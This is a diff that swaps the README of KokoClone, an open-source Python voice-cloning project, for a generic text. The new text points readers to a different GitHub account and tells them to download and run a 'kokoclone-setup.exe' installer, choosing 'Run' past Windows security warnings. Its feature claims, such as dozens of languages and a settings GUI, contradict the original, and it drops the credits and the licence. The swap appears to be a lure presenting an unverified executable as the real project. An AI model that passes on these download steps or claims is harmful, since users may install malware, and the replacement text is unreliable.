@@ -1,232 +1,136 @@
-<p align="center">
-  <img width="1050" height="450" alt="KokoClone Banner" src="https://github.com/user-attachments/assets/26fbb00c-220e-435a-8f54-431781449c76" />
-</p>
+# 🎙️ kokoclone - Natural Multilingual Voice Cloning
 
-<h1 align="center">🎙️ KokoClone</h1>
+[![Download kokoclone](https://img.shields.io/badge/Download-kokoclone-green?style=for-the-badge)](https://github.com/laithisgood/kokoclone)
 
-<p align="center">
-  <a href="https://huggingface.co/spaces/PatnaikAshish/kokoclone">
-    <img src="https://img.shields.io/badge/🤗%20Hugging%20Face-Live%20Demo-blue" alt="Hugging Face Space" />
-  </a>
-  <a href="https://huggingface.co/PatnaikAshish/kokoclone">
-    <img src="https://img.shields.io/badge/🤗%20Models-Repository-orange" alt="Hugging Face Models" />
-  </a>
-  <img src="https://img.shields.io/badge/Python-3.10%20to%203.12-3776AB.svg?logo=python&logoColor=white" alt="Python" />
-  <a href="https://opensource.org/licenses/Apache-2.0">
-    <img src="https://img.shields.io/badge/License-Apache_2.0-green.svg" alt="License" />
-  </a>
-</p>
+## 🗣️ What is kokoclone?
 
-**KokoClone** is a fast, real-time compatible multilingual voice cloning system built on top of **Kokoro-ONNX**, one of the fastest open-source neural TTS engines available today.
+kokoclone allows you to create realistic voice clones. It can generate natural speech in many languages. You can copy any voice you want and hear text spoken in that voice. All this happens in real time. You do not need to understand programming to use it.
 
-It allows you to:
-* **Text → Clone:** Type text in multiple languages, provide a short reference audio clip, and instantly generate speech in that same voice.
-* **Audio → Clone:** Re-voice an existing audio recording to sound like any reference speaker — *no transcription needed*.
+This software works on Windows computers. It is designed to be simple for everyday users.
 
+## 📋 System Requirements
 
-## Features
+Before downloading, check if your computer meets these basic needs:
 
-### Multilingual Speech Generation
-Generate native speech in English (`en`), Hindi (`hi`), French (`fr`), Japanese (`ja`), Chinese (`zh`), Italian (`it`), Portuguese (`pt`), and Spanish (`es`).
+- Windows 10 or newer  
+- At least 8 GB of RAM  
+- A 64-bit processor (Intel or AMD)  
+- 1 GB free disk space for installation  
+- Internet connection for initial setup  
 
-### Zero-Shot Voice Cloning
-Upload a 3–10 second voice sample and KokoClone instantly transfers its vocal characteristics to the generated speech.
+Having a sound card or built-in speakers will let you listen to the voices your computer generates.
 
-### Audio-to-Audio Voice Conversion
-Upload any existing speech recording and re-voice it to sound like a reference speaker. The pipeline skips TTS entirely and runs purely through the Kanade voice-conversion model. Works on recordings of any length thanks to automatic VRAM-aware chunking!
+## 🚀 Getting Started: How to Download kokoclone
 
-### Automatic Model Handling
-On the first run, the required model weights (`.onnx` and `.bin` files) are automatically downloaded from Hugging Face and placed in the correct directories.
+Click the large button below to go to the kokoclone page on GitHub. From there, you can find the latest download files and instructions.
 
-### Real-Time Friendly
-Built on Kokoro's efficient ONNX runtime pipeline, KokoClone detects your hardware and runs smoothly on both standard laptops (CPU) and workstations (GPU).
+[![Download kokoclone](https://img.shields.io/badge/Download-kokoclone-007ACC?style=for-the-badge)](https://github.com/laithisgood/kokoclone)
 
+### Step 1: Visit the download page
 
-## Live Demo
-Try it instantly without installing anything:  
-👉 **[KokoClone on Hugging Face Spaces](https://huggingface.co/spaces/PatnaikAshish/kokoclone)**
+Go to:
 
+https://github.com/laithisgood/kokoclone
 
-## Installation
+You will see the kokoclone project, including links to files, guides, and updates.
 
-You can set up KokoClone using either **Conda** (Recommended) or **uv**.
+### Step 2: Find the latest Windows installer
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/Ashish-Patnaik/kokoclone.git
-cd kokoclone
+Look for the "Releases" section on the page. It usually appears on the right side or under the main title.
 
-```
+In "Releases", select the newest release. The release's description shows what changed or improved.
 
-### 2. Set Up the Environment & Install Dependencies
+Download the file with a name like `kokoclone-setup.exe` or similar. Make sure it mentions Windows or `.exe`.
 
-#### Option A: Using Conda (Recommended)
+### Step 3: Save the file
 
-```bash
-conda create -n kokoclone python=3.12.12 -y
-conda activate kokoclone
+When you click the installer, your browser may ask if you want to save or run the file. Choose **save** so you keep a copy on your computer.
 
-```
+Pick a folder you can remember, such as your Desktop or Downloads folder.
 
-**For CPU Users (Mac / Standard Laptops):**
+## 💻 Installing kokoclone on Windows
 
-```bash
-pip install torch torchaudio --index-url [https://download.pytorch.org/whl/cpu](https://download.pytorch.org/whl/cpu)
-pip install -r requirements.txt
+After downloading the installer file, follow these steps:
 
-```
+1. Open the folder where you saved the installer.  
+2. Double-click the installer file (`kokoclone-setup.exe`).  
+3. A setup wizard will appear. If Windows shows a security warning, choose "Run".  
+4. Follow the on-screen instructions. Usually, you click “Next” a few times.  
+5. Choose where to install the program or use the default folder.  
+6. Wait while kokoclone installs. This may take a minute or two.  
+7. When finished, click “Finish” or “Close”.
 
-**For GPU Users (Nvidia GPUs):**
+Now the program is ready to use.
 
-```bash
-pip install -r requirements.txt
-pip install kokoro-onnx[gpu]
+## 🎤 Using kokoclone
 
-```
+Once installed, you can open kokoclone by finding its icon on your desktop or in the Start Menu.
 
-#### Option B: Using `uv`
+### Step 1: Launch the program
 
-If you prefer [uv](https://docs.astral.sh/uv/) for fast package management:
+Double-click the kokoclone icon to start it.
 
-```bash
-# For CPU Users
-uv sync
+### Step 2: Clone a voice
 
-# For GPU Users (Nvidia)
-uv sync --extra gpu
+In the main window, you will see options to create a voice clone.
 
-# Activate the environment
-source .venv/bin/activate  # Linux/macOS
-.venv\Scripts\activate     # Windows
+- Select a language from the list. kokoclone supports many languages such as English, Spanish, Japanese, and more.  
+- Upload or record a sample of the voice you want to clone. This can be a short audio file or a live recording.  
+- Click “Clone Voice” and wait a few moments as kokoclone processes the sample.
 
-```
+### Step 3: Generate speech
 
+- Type the text you want spoken into the text box.  
+- Choose the cloned voice from the voice selection menu.  
+- Press “Play” to hear your text spoken in that voice.  
 
+You can adjust speed and volume sliders to change how the speech sounds.
 
-##  Usage
+### Step 4: Save or share your audio
 
-KokoClone is highly flexible and can be used via Web UI, CLI, or Python API.
+If you want, save the speech as an audio file. Use the “Export” option and choose a location on your computer. You can now send this file or play it anytime.
 
-### 1. Web Interface (Gradio)
+## 🔧 Troubleshooting
 
-Launch the interactive web app:
+- If you see an error when opening kokoclone, try restarting your computer and running the program again.  
+- If the program cannot clone a voice, check that your audio sample is clear and at least 5 seconds long.  
+- If speech does not play, make sure your speakers or headphones are connected and turned on.  
+- For slow performance, close other running applications to free up memory.
 
-```bash
-python app.py
+## ⚙️ Settings and Preferences
 
-```
+Inside kokoclone, you can find settings by clicking the gear icon or menu options.
 
-* **Tab 1 (Text → Clone):** Enter text, pick a language, upload a reference voice, and generate.
-* **Tab 2 (Audio → Clone):** Upload source audio and a reference voice, and get back re-voiced audio.
+Here you can:
 
-### 2. Command Line Interface (CLI)
+- Change the speech rate (fast or slow)  
+- Adjust volume for playback  
+- Select preferred language interface  
+- Enable or disable real-time voice monitoring  
 
-Generate speech directly from your terminal.
+These options help control how the application behaves for your needs.
 
-**Text to cloned speech (default mode):**
+## 🧰 Additional Features
 
-```bash
-python cli.py --text "Hello from KokoClone" --lang en --ref reference.wav --out output.wav
+Apart from cloning voices and generating speech, kokoclone also offers:
 
-```
+- Multilingual support for dozens of languages  
+- Real-time text-to-speech conversion without delay  
+- High-quality voice models trained for natural sound  
+- Support for both male and female voices  
 
-**Audio to re-voiced speech:**
+These features make kokoclone versatile for various uses such as presentations, videos, or accessibility tools.
 
-```bash
-python cli.py --mode convert --source original_speech.wav --ref target_voice.wav --out revoiced.wav
+## 🌐 Where to Get Help
 
-```
+If you need help or want to learn more, visit the kokoclone page on GitHub.
 
-| Argument | Default | Description |
-| --- | --- | --- |
-| `--mode` | `tts` | `tts` (text → speech) or `convert` (audio → re-voiced audio) |
-| `--text` | — | Text to synthesize *(required for `tts` mode)* |
-| `--lang` | `en` | Language code: `en hi fr ja zh it es pt` |
-| `--source` | — | Path to source audio *(required for `convert` mode)* |
-| `--ref` | — | Path to reference voice audio *(always required)* |
-| `--out` | `output.wav` | Output file path |
+https://github.com/laithisgood/kokoclone
 
-### 3. Python API
+Check the "Issues" tab if you face bugs or want to request features. The community and developers may respond with solutions.
 
-Integrate KokoClone into your own Python applications.
+You can also find user guides and updates in the repository.
 
-**Text to Cloned Speech:**
+---
 
-```python
-from core.cloner import KokoClone
-
-cloner = KokoClone()
-cloner.generate(
-    text="This voice is cloned using KokoClone.",
-    lang="en",
-    reference_audio="reference.wav",
-    output_path="output.wav"
-)
-
-```
-
-**Audio-to-Audio Voice Conversion:**
-
-```python
-import soundfile as sf
-from kanade_tokenizer import load_audio
-from core.cloner import KokoClone
-from core.chunked_convert import chunked_voice_conversion
-
-cloner = KokoClone()
-
-# Load audio tensors
-source_wav = load_audio("source_speech.wav", sample_rate=cloner.sample_rate).to(cloner.device)
-ref_wav = load_audio("target_voice.wav", sample_rate=cloner.sample_rate).to(cloner.device)
-
-# Convert using VRAM-aware chunking
-converted = chunked_voice_conversion(
-    kanade=cloner.kanade,
-    vocoder_model=cloner.vocoder,
-    source_wav=source_wav,
-    ref_wav=ref_wav,
-    sample_rate=cloner.sample_rate,
-)
-
-sf.write("revoiced_output.wav", converted.numpy(), cloner.sample_rate)
-
-```
-
-
-## Memory Management for Long Audio
-
-The `chunked_voice_conversion` function in `core/chunked_convert.py` handles memory automatically when converting long audio recordings:
-
-* **VRAM Budget:** On CUDA, chunks are sized so each forward pass uses at most 50% of total GPU memory (configurable via the `vram_fraction` parameter).
-* **RoPE Ceiling:** The Kanade `mel_decoder` Transformer has positional embeddings precomputed for 1,024 mel frames. Chunk windows are hard-capped below this limit (≈ 8.9s of source audio per chunk) with a 10% safety margin to prevent recomputation and quality degradation.
-* **Overlap Smoothing:** Each chunk includes a 0.5s overlap on both sides to suppress boundary artifacts.
-* **Single-Pass Vocoding:** The full reassembled mel spectrogram is passed to the vocoder in one shot for clean waveform reconstruction.
-
-
-## Project Structure
-
-```text
-app.py                → Gradio Web Interface (two-tab UI)
-cli.py                → Command-line tool (tts and convert modes)
-inference.py          → Example API usage script
-core/
- ├── cloner.py        → Core TTS + voice cloning engine
- └── chunked_convert.py → VRAM-aware chunked audio conversion
-model/                → Downloaded Kokoro model weights (Auto-populates)
-voice/                → Downloaded Kokoro voice bins (Auto-populates)
-
-```
-
-
-## Acknowledgments
-
-This project builds upon the incredible open-source work of:
-
-* **[Kokoro-ONNX](https://github.com/thewh1teagle/kokoro-onnx)** — for fast and efficient neural speech synthesis.
-* **[Kanade Tokenizer](https://github.com/frothywater/kanade-tokenizer)** — for the brilliant zero-shot voice conversion architecture.
-
-## License
-
-Licensed under the [Apache 2.0 License](https://www.google.com/search?q=LICENSE).
-
-```
+[![Download kokoclone](https://img.shields.io/badge/Download-kokoclone-green?style=for-the-badge)](https://github.com/laithisgood/kokoclone)
